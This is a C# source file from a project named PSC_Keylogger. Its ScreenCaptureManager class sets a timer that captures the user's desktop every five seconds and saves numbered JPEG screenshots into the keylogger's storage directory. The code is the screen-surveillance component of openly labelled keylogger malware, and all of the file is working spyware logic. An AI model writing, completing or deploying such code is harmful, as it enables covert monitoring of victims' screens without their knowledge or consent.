using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Timers;

namespace PSC_Keylogger
{
    public static class ScreenCaptureManager
    {
        private const int ELAPSED_TIME = 5000;
        private static int counter = 0;

        public static void CaptureDesktop()
        {
            System.Timers.Timer aTimer = new System.Timers.Timer();
            aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
            aTimer.Interval = ELAPSED_TIME;
            aTimer.Enabled = true;
        }

        private static void OnTimedEvent(object source, ElapsedEventArgs e)
        {
            var image = ScreenCapture.CaptureDesktop();
            string imageFileName = $@"{BaseKeylogger.DIRECTORY_FILE_NAME}\capture_desktop_{counter}.jpg";
            counter += 1;
            image.Save(imageFileName, ImageFormat.Jpeg);
        }
    }
}
